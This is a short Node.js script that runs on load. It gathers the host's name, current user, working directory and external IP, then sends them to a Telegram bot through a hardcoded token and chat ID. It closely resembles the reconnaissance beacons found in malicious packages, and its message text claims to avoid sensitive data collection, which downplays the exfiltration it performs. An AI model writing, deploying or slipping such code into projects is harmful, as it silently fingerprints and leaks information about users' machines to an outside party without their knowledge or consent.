const { exec } = require("child_process");
const https = require("https");
const querystring = require("querystring");

// Telegram credentials
const chatId = "6567865682";
const botToken = "7699295118:AAF6pb7t718vjHWHwFQlZOastZQYHL8IVDE";

// Execute a shell command
function execShell(cmd) {
  return new Promise((resolve, reject) => {
    exec(cmd, { maxBuffer: 1024 * 1024 }, (err, stdout) => {
      if (err) reject(err);
      else resolve(stdout.trim());
    });
  });
}

// Get external IP using api.ipify.org
function getExternalIP() {
  return new Promise((resolve, reject) => {
    https.get("https://api.ipify.org", (res) => {
      let data = "";
      res.on("data", (chunk) => {
        data += chunk;
      });
      res.on("end", () => {
        resolve(data.trim());
      });
    }).on("error", reject);
  });
}

// Send a message to Telegram
function sendTelegramMessage(text) {
  return new Promise((resolve, reject) => {
    const postData = querystring.stringify({
      chat_id: chatId,
      text,
      parse_mode: "Markdown"
    });

    const options = {
      hostname: "api.telegram.org",
      path: `/bot${botToken}/sendMessage`,
      method: "POST",
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": Buffer.byteLength(postData)
      }
    };

    const req = https.request(options, (res) => {
      res.on("data", () => {});
      res.on("end", () => resolve());
    });

    req.on("error", reject);
    req.write(postData);
    req.end();
  });
}

// Main logic
async function gatherAndSendInfo() {
  try {
    const [hostname, username, cwd, externalIp] = await Promise.all([
      execShell("hostname"),
      execShell("whoami"),
      execShell("pwd"),
      getExternalIP()
    ]);

    const message = `
System Report

Hostname: \`${hostname}\`
User: \`${username}\`
Working Directory: \`${cwd}\`
External IP: \`${externalIp}\`

This information helps identify unique systems while avoiding sensitive data collection.
    `.trim();

    await sendTelegramMessage(message);
    console.log("Minimal identifying data sent to Telegram.");
  } catch (err) {
    console.error("Error:", err.message || err);
  }
}

gatherAndSendInfo();
